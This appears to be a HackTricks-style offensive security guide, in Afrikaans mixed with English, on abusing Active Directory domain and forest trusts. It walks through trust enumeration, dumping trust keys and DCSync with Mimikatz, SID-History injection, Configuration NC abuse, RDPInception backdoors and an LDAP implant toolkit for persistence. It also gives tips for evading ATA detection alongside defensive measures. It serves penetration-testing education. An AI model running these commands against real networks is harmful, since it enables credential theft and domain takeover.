Microsoft beskou die **Forest** as die sekuriteitsgrens. Dit impliseer dat **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

'n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is 'n sekuriteitsmeganisme wat 'n gebruiker van een **domain** toelaat om hulpbronne in 'n ander **domain** te access. Dit skep 'n skakel tussen die autentiseringsisteme van die twee domeine, sodat verifikasievloei makliker kan plaasvind. Wanneer domeine 'n trust opstel, ruil en stoor hulle spesifieke **keys** binne hul **Domain Controllers (DCs)**, wat noodsaaklik is vir die integriteit van die trust.

In 'n tipiese scenario, as 'n gebruiker 'n diens in 'n **trusted domain** wil access, moet hulle eers 'n spesiale kaart – 'n **inter-realm TGT** – by hul eie domein se DC versoek. Hierdie TGT is geënkripteer met 'n gedeelde **key** wat beide domeine ooreengekom het. Die gebruiker bied dan die inter-realm TGT aan die **DC of the trusted domain** om 'n service ticket (**TGS**) te kry. By suksesvolle verifikasie van die inter-realm TGT deur die trusted domain se DC, gee dit 'n TGS uit, wat die gebruiker toegang tot die diens verleen.

**Steps**:

1. 'n **client computer** in **Domain 1** begin die proses deur sy **NTLM hash** te gebruik om 'n **Ticket Granting Ticket (TGT)** van sy **Domain Controller (DC1)** te versoek.
2. DC1 gee 'n nuwe TGT uit as die kliënt suksesvol geverifieer word.
3. Die kliënt versoek dan 'n **inter-realm TGT** van DC1, wat nodig is om hulpbronne in **Domain 2** te access.
4. Die inter-realm TGT is geënkripteer met 'n **trust key** wat tussen DC1 en DC2 gedeel word as deel van die two-way domain trust.
5. Die kliënt neem die inter-realm TGT na **Domain 2's Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust key en, indien geldig, gee dit 'n **Ticket Granting Service (TGS)** uit vir die bediener in Domain 2 wat die kliënt wil access.
7. Uiteindelik bied die kliënt hierdie TGS aan die bediener, wat geënkripteer is met die bediener se account hash, om toegang tot die diens in Domain 2 te kry.

### Different trusts

Dit is belangrik om te let dat **a trust can be 1 way or 2 ways**. In die 2-weg opsie vertrou beide domeine mekaar, maar in 'n **1 way** trustverhouding sal een van die domeine die **trusted** wees en die ander die **trusting** domein. In laasgenoemde geval sal **jy slegs in staat wees om hulpbronne binne die trusting domain vanaf die trusted een te access**.

As Domain A Domain B vertrou, is A die trusting domain en B die trusted een. Verder sal dit in **Domain A** 'n **Outbound trust** wees; en in **Domain B** sal dit 'n **Inbound trust** wees.

**Different trusting relationships**

- **Parent-Child Trusts**: Dit is 'n algemene opstelling binne dieselfde forest, waar 'n child domain outomaties 'n two-way transitive trust met sy parent domain het. Dit beteken basies dat autentiseringsversoeke naatloos tussen die parent en die child kan vloei.
- **Cross-link Trusts**: Genoem "shortcut trusts", hierdie word geskep tussen child domains om die referral prosesse te versnel. In komplekse forests moet autentiseringsverwysings gewoonlik opgaan na die forest root en dan af na die teiken-domein; deur cross-links te skep, word die reis verkort, wat veral voordelig is in geografies verspreide omgewings.
- **External Trusts**: Hierdie word opgestel tussen verskillende, nie-verwante domeine en is inherent non-transitive. Volgens [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig vir toegang tot hulpbronne in 'n domein buite die huidige forest wat nie deur 'n forest trust verbind is nie. Sekuriteit word verbeter deur SID filtering met external trusts.
- **Tree-root Trusts**: Hierdie trusts word outomaties gevestig tussen die forest root domain en 'n nuut bygevoegde tree root. Alhoewel dit nie algemeen voorkom nie, is tree-root trusts belangrik vir die byvoeging van nuwe domain trees aan 'n forest, wat hulle toelaat om 'n unieke domeinnaam te behou en two-way transitivity te verseker. Meer inligting is beskikbaar in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Hierdie tipe trust is 'n two-way transitive trust tussen twee forest root domains, en afdwing ook SID filtering om sekuriteitsmaatreëls te verbeter.
- **MIT Trusts**: Hierdie trusts word gevestig met nie-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos-domeine. MIT trusts is meer gespesialiseerd en rig op omgewings wat integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem benodig.

#### Other differences in **trusting relationships**

- 'n Trustverhouding kan ook **transitive** wees (A vertrou B, B vertrou C, dan vertrou A C) of **non-transitive**.
- 'n Trustverhouding kan opgestel word as **bidirectional trust** (albei vertrou mekaar) of as **one-way trust** (slegs een vertrou die ander).

### Attack Path

1. **Enumerate** die trusting relationships
2. Kyk of enige **security principal** (user/group/computer) **access** tot hulpbronne van die **other domain** het, dalk deur ACE entries of deur deel te wees van groepe van die ander domein. Soek na **relationships across domains** (die trust is waarskynlik hiervoor geskep).
1. kerberoast in hierdie geval kan 'n ander opsie wees.
3. **Compromise** die **accounts** wat deur domeine kan **pivot**.

Aanvallers kan toegang tot hulpbronne in 'n ander domein kry deur drie primêre meganismes:

- **Local Group Membership**: Principals kan bygevoeg word tot plaaslike groepe op masjiene, soos die "Administrators" groep op 'n bediener, wat hulle beduidende beheer oor daardie masjien gee.
- **Foreign Domain Group Membership**: Principals kan ook lede wees van groepe binne die vreemde domein. Die doeltreffendheid van hierdie metode hang egter af van die aard van die trust en die omvang van die groep.
- **Access Control Lists (ACLs)**: Principals kan in 'n **ACL** gespesifiseer wees, veral as entiteite in **ACEs** binne 'n **DACL**, wat hulle toegang tot spesifieke hulpbronne gee. Vir diegene wat die ins en outs van ACLs, DACLs, en ACEs wil bemeester, is die whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 'n baie waardevolle hulpbron.

### Find external users/groups with permissions

Jy kan kyk na **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** om foreign security principals in die domein te vind. Hierdie sal gebruikers/groepe wees van **an external domain/forest**.

Jy kan dit in **Bloodhound** nagaan of powerview gebruik om dit te doen:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domeinvertroue te enumereer:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 vertroude sleutels**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domein gebruik word daarmee kry:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaleer as Enterprise admin na die child/parent domain deur die trust met SID-History injection te misbruik:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Om te verstaan hoe die Configuration Naming Context (NC) uitgebuit kan word, is van kardinale belang. Die Configuration NC dien as 'n sentrale repository vir konfigurasiedata oor 'n forest in Active Directory (AD)-omgewings. Hierdie data word na elke Domain Controller (DC) binne die forest gerepliseer, met writable DCs wat 'n skryfbare kopie van die Configuration NC handhaaf. Om dit te kan misbruik, moet 'n mens **SYSTEM privileges op 'n DC** hê, by voorkeur 'n child DC.

**Link GPO to root DC site**

Die Configuration NC se Sites-container sluit inligting in oor die sites van alle domain-joined rekenaars binne die AD-forest. Deur met SYSTEM-privileges op enige DC te werk, kan aanvallers GPOs aan die root DC-sites koppel. Hierdie aksie kan moontlik die root-domein kompromitteer deur die beleid wat op hierdie sites toegepas word, te manipuleer.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

'n Aanvalsvektor behels die teiken van bevoorregte gMSAs binne die domein. Die KDS Root key, noodsaaklik vir die berekening van gMSA-wagwoorde, word binne die Configuration NC gestoor. Met SYSTEM-privileges op enige DC is dit moontlik om toegang tot die KDS Root key te kry en die wagwoorde vir enige gMSA regoor die forest te bereken.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Hierdie metode verg geduld — wag vir die skepping van nuwe bevoorregte AD-objekte. Met SYSTEM-privileges kan 'n aanvaller die AD Schema wysig om enige gebruiker volle beheer oor alle klasse te gee. Dit kan lei tot ongemagtigde toegang en beheer oor nuut geskepte AD-objekte.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-vulnerabiliteit mik om beheer oor Public Key Infrastructure (PKI)-objekte te verkry om 'n sertifikaattemplate te skep wat verifikasie as enige gebruiker binne die forest moontlik maak. Aangesien PKI-objekte in die Configuration NC woon, maak die kompromittering van 'n skryfbare child DC die uitvoering van ESC5-aanvalle moontlik.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario word **jou domein vertrou** deur 'n eksterne domein wat jou **onbepaalde permissies** daaroor gee. Jy moet uitvind **watter principals van jou domein watter toegang tot die eksterne domein het** en dan probeer om dit te misbruik:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest-domein - Eenrigting (Uitgaand)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario vertrou **jou domein** sekere **bevoegdhede** aan 'n prinsipaal van 'n **verskillende domein**.

Wanneer 'n **domein vertrou** word deur die vertrouende domein, skep die vertroude domein 'n **gebruiker** met 'n **voorspelbare naam** wat as **wagwoord die vertroude wagwoord** gebruik. Dit beteken dat dit moontlik is om 'n **gebruiker van die vertrouende domein te benader om binne die vertroude domein in te kom** om dit te enumereer en te probeer meer bevoegdhede op te skaal:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog 'n manier om die vertroude domein te kompromitteer is om 'n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domeinvertrouenskap geskep is (wat nie baie algemeen is nie).

Nog 'n manier om die vertroude domein te kompromitteer is om in 'n masjien te wag waar 'n **gebruiker van die vertroude domein toegang het** om via **RDP** aan te meld. Dan kan die aanvaller kode in die RDP-sessieproses insit en **van daar af toegang kry tot die oorspronklike domein van die slagoffer**. Verder, as die **slagoffer sy hardeskyf gemonteer het**, kan die aanvaller vanuit die **RDP-sessie** proses **backdoors** in die **opstartgids van die hardeskyf** stoor. Hierdie tegniek word **RDPInception** genoem.

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigering van domeinvertrou-misbruik

### **SID Filtering:**

- Die risiko van aanvalle wat die SID history-attribuut oor forest trusts benut, word versag deur SID Filtering, wat standaard geaktiveer is op alle inter-forest trusts. Dit berus op die aanname dat intra-forest trusts veilig is, en beskou die forest, eerder as die domein, as die sekuriteitsgrens volgens Microsoft se standpunt.
- Daar is egter 'n vang: SID Filtering kan toepassings en gebruikerstoegang ontwrig, wat soms lei tot die deaktivering daarvan.

### **Selective Authentication:**

- Vir inter-forest trusts verseker die gebruik van Selective Authentication dat gebruikers van die twee forests nie outomaties geverifieer word nie. In plaas daarvan is eksplisiete toestemmings nodig vir gebruikers om toegang tot domeine en bedieners binne die vertrouende domein of forest te kry.
- Dit is belangrik om op te let dat hierdie maatreëls nie beskerming bied teen die uitbuiting van die writable Configuration Naming Context (NC) of aanvalle op die trust account nie.

[**Meer inligting oor domeinvertroue op ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementeer bloodyAD-style LDAP-primitewe as x64 Beacon Object Files wat heeltemal binne 'n on-host implant (bv. Adaptix C2) loop. Operateurs kompileer die pakket met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en skakel dan `ldap <subcommand>` vanaf die beacon. Al die verkeer gebruik die huidige aanmeld-sekuriteitskonteks oor LDAP (389) met signing/sealing of LDAPS (636) met outomatiese sertifikaatvertroue, so geen socks proxies of disk artefakte is nodig nie.

### Implant-side LDAP enumerasie

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` los kort name/OU-paaie op in volledige DNs en dump die ooreenstemmende objekke.
- `get-object`, `get-attribute`, and `get-domaininfo` trek arbitrêre attributen (insluitend security descriptors) plus die forest/domain metadata vanaf `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` onthul roasting candidates, delegation settings, en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors direk vanaf LDAP.
- `get-acl` en `get-writable --detailed` ontleed die DACL om trustees, regte (GenericAll/WriteDACL/WriteOwner/attribute writes), en erfenis te lys, wat onmiddellike teikens vir ACL privilege escalation gee.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write-primitive vir eskalasie en persistensie

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operateur nuwe gebruikers of masjienrekeninge plaas waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute`, en `set-attribute` kap teikens direk sodra write-property regte gevind word.
- ACL-gefokusde opdragte soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, en `add-dcsync` vertaal WriteDACL/WriteOwner op enige AD-objek in wagwoordreset, groep-lidmaatskapbeheer, of DCSync-replikasievoorregte sonder om PowerShell/ADSI-artefakte te laat. `remove-*` teenhangers maak die ingespuite ACEs skoon.

### Delegasie, roasting, en Kerberos-misbruik

- `add-spn`/`set-spn` maak 'n gekompromitteerde gebruiker onmiddellik Kerberoastable; `add-asreproastable` (UAC toggle) merk dit vir AS-REP roasting sonder om die wagwoord te raak.
- Delegasie-makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC flags, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD-aanvalspaaie moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory injection, OU-herlokalisering, en vorming van aanvaloppervlak

- `add-sidhistory` injekteer bevoorregte SIDs in die SID-geskiedenis van 'n beheerste principal (sien [SID-History Injection](sid-history-injection.md)), wat heimlike toegangserfenis bied volledig oor LDAP/LDAPS.
- `move-object` verander die DN/OU van rekenaars of gebruikers, wat 'n aanvaller toelaat om bates na OUs te skuif waar gedelegeerde regte reeds bestaan voordat hulle `set-password`, `add-groupmember`, of `add-spn` misbruik.
- Skerp afgebakende verwyderingsopdragte (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) maak vinnige rollback moontlik nadat die operateur kredensiale of persistensie ingesamel het, en minimaliseer telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Sommige Algemene Verdedigings

[**Vind hier meer uit oor hoe om kredensiale te beskerm.**](../stealing-credentials/credentials-protections.md)

### **Verdedigingsmaatreëls vir Kredensiaalbeskerming**

- **Domain Admins Restrictions**: Dit word aanbeveel dat Domain Admins slegs toegelaat word om op Domain Controllers aan te meld en dat hul gebruik op ander hosts vermy word.
- **Service Account Privileges**: Dienste moet nie met Domain Admin (DA) voorregte uitgevoer word nie om sekuriteit te handhaaf.
- **Temporal Privilege Limitation**: Vir take wat DA-voorregte benodig, moet hul duur beperk word. Dit kan bereik word met: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementering van Misleidingstegnieke**

- Implementering van misleiding behels die opstel van lokvalle, soos lok-gebruikers of -rekenaars, met kenmerke soos wagwoorde wat nie verval nie of wat as Trusted for Delegation gemerk is. 'n Gedetailleerde benadering sluit in die skep van gebruikers met spesifieke regte of om hulle by hoë-privilegie-groepe te voeg.
- 'n Praktiese voorbeeld behels die gebruik van gereedskap soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooiing van misleidingstegnieke is te vinde by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifisering van Misleiding**

- **For User Objects**: Verdagte aanduiders sluit in 'n atypiese ObjectSID, ongereelde aanmeldings, skeppingsdatums, en lae badPasswordCount.
- **Algemene Aanduiders**: Deur eienskappe van potensiële lokvoorwerpe met dié van egte voorwerpe te vergelyk, kan inkonsekwenthede aan die lig kom. Gereedskap soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke misleiding te identifiseer.

### **Omseil van Opsporingstelsels**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermy sessie-enumerasie op Domain Controllers om ATA-detectie te voorkom.
- **Ticket Impersonation**: Die gebruik van **aes** sleutels vir ticket-skepping help om opsporing te omseil deur nie af te skakel na NTLM nie.
- **DCSync Attacks**: Dit word aanbeveel om dit vanaf 'n nie-Domain Controller uit te voer om ATA-detectie te vermy, aangesien direkte uitvoering vanaf 'n Domain Controller waarskuwings sal veroorsaak.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
